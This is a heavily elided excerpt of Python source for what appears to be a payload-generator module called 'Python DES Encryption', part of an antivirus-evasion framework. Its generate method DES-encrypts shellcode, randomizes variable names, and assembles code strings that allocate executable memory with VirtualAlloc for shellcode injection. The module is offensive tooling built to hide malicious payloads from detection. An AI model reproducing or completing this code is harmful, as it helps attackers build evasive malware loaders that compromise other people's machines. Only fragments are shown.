...
class PayloadModule:
    ...
    def __init__(self, cli_obj):
        ...
        self.name = "Python DES Encryption"
        self.path = "python/shellcode_inject/des_encrypt"
    ...
    def generate(self):
        ...
        encoded_ciphertext, encryption_key, iv_value = encryption.des_encryption(Shellcode)
        ...
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            ...
            payload_code += '\t' * num_tabs_required + rand_ptr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\n'
